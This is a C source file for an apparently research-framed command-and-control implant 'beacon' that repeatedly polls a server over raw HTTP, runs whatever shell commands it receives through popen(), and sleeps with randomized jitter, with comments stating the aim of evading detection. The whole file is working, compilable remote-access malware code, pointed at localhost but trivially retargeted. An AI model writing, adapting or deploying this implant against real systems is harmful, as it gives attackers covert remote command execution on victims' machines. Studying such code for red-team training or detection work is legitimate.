/*
 * Project: C2 Architecture PoC
 * Module: Beacon (Heartbeat Logic)
 * Author: mauvehack
 * License: MIT
 * * Description:
 * This module implements the asynchronous command polling loop.
 * It establishes a TCP connection to the Team Server, negotiates
 * tasks via HTTP GET/POST, and manages the operational security (OPSEC)
 * sleep cycle (Jitter).
 * * Compilation (Linux/macOS):
 * gcc -o beacon beacon.c -Wall
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>

// --- Configuration ---
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080
#define AGENT_ID "39a0-research-poc" // Static ID for PoC; normally dynamic
#define USER_AGENT "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
#define BUFFER_SIZE 4096

// --- Operational Parameters ---
#define SLEEP_INTERVAL 5  // Base seconds
#define JITTER_PERCENT 0.20 // 20% Variance

// --- Function Prototypes ---
void beacon_loop();
int connect_to_server();
char* send_http_request(const char* method, const char* endpoint, const char* payload);
void process_task(const char* response);
void jitter_sleep(int base_interval, float jitter);
void exec_shell_command(const char* cmd, char* output_buffer);

int main() {
    printf("[*] C2 Implant Active (PID: %d)\n", getpid());
    printf("[*] Target Server: %s:%d\n", SERVER_IP, SERVER_PORT);
    
    // Seed the random number generator for Jitter
    srand(time(NULL));

    // Begin the main operational loop
    beacon_loop();

    return 0;
}

/*
 * Function: beacon_loop
 * ---------------------
 * The primary lifecycle of the implant. It loops indefinitely,
 * checking for tasks and sleeping to evade detection.
 */
void beacon_loop() {
    char endpoint[128];
    snprintf(endpoint, sizeof(endpoint), "/api/v1/beacon/%s", AGENT_ID);

    while (1) {
        printf("[*] Heartbeat: Sending Beacon...\n");
        
        // 1. Send GET Request (Check-in)
        char* response = send_http_request("GET", endpoint, NULL);
        
        if (response) {
            // 2. Process Response (Mock JSON Parsing)
            process_task(response);
            free(response);
        } else {
            printf("[-] Connection Failed. Retrying after sleep.\n");
        }

        // 3. Operational Security Sleep
        jitter_sleep(SLEEP_INTERVAL, JITTER_PERCENT);
    }
}

/*
 * Function: process_task
 * ----------------------
 * Parses the raw HTTP response to identify task instructions.
 * Note: For this PoC, we use basic string searching (strstr) instead of 
 * a heavy JSON parsing library to keep the implant lightweight.
 */
void process_task(const char* response) {
    // Locate the start of the JSON body (after HTTP headers)
    const char* body = strstr(response, "\r\n\r\n");
    if (!body) return;
    body += 4; // Skip the CRLF

    // Check for "exec" action
    if (strstr(body, "\"action\": \"exec\"")) {
        // Extract command (Quick & Dirty parsing for PoC)
        char* cmd_start = strstr(body, "\"command\": \"");
        if (cmd_start) {
            cmd_start += 12; // Skip Key
            char* cmd_end = strchr(cmd_start, '"');
            if (cmd_end) {
                *cmd_end = '\0'; // Null-terminate the command string
                
                printf("[+] Received Task: %s\n", cmd_start);
                
                // Execute Logic
                char result_buf[BUFFER_SIZE] = {0};
                exec_shell_command(cmd_start, result_buf);

                // Send Results Back
                // In a full implementation, this would POST to /api/v1/results
                printf("[*] Task Execution Output:\n%s\n", result_buf);
            }
        }
    } else if (strstr(body, "\"action\": \"sleep\"")) {
        // No tasks pending
        printf("[*] No tasks. Idling.\n");
    }
}

/*
 * Function: send_http_request
 * ---------------------------
 * Constructs a raw HTTP packet and transmits it via TCP socket.
 * Returns: Heap-allocated string containing server response (must be freed).
 */
char* send_http_request(const char* method, const char* endpoint, const char* payload) {
    int sock = connect_to_server();
    if (sock < 0) return NULL;

    char request[BUFFER_SIZE];
    memset(request, 0, BUFFER_SIZE);

    // Build HTTP Headers
    snprintf(request, sizeof(request),
             "%s %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Connection: close\r\n"
             "Content-Type: application/json\r\n"
             "\r\n", // End of Headers
             method, endpoint, SERVER_IP, USER_AGENT);

    // Send Request
    if (send(sock, request, strlen(request), 0) < 0) {
        perror("[-] Send failed");
        close(sock);
        return NULL;
    }

    // Receive Response
    char* response = malloc(BUFFER_SIZE);
    memset(response, 0, BUFFER_SIZE);
    
    // Read loop (simplified for PoC - assumes response fits in buffer)
    int bytes_received = recv(sock, response, BUFFER_SIZE - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        free(response);
        return NULL;
    }

    return response;
}

/*
 * Function: connect_to_server
 * ---------------------------
 * Standard POSIX socket connection setup.
 */
int connect_to_server() {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        return -1;
    }

    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        return -1;
    }
    return sock;
}

/*
 * Function: exec_shell_command
 * ----------------------------
 * Runs a system command via popen() and captures stdout.
 */
void exec_shell_command(const char* cmd, char* output_buffer) {
    FILE* fp = popen(cmd, "r");
    if (fp == NULL) {
        strcpy(output_buffer, "Error: Failed to run command");
        return;
    }

    // Read output line by line into buffer
    while (fgets(output_buffer + strlen(output_buffer), 
                 BUFFER_SIZE - strlen(output_buffer) - 1, fp) != NULL) {
        // Continue reading
    }
    pclose(fp);
}

/*
 * Function: jitter_sleep
 * ----------------------
 * Implements the randomization of beacon intervals.
 * Formula: Sleep = Interval +/- (Interval * Jitter%)
 */
void jitter_sleep(int base_interval, float jitter) {
    float variance = base_interval * jitter;
    // Generate random float between -variance and +variance
    float offset = ((float)rand() / (float)(RAND_MAX)) * (2 * variance) - variance;
    
    float total_sleep = base_interval + offset;
    if (total_sleep < 0) total_sleep = 0;

    printf("[*] Sleeping for %.2f seconds (Jitter: %.0f%%)\n", total_sleep, jitter * 100);
    usleep((int)(total_sleep * 1000000)); // usleep takes microseconds
}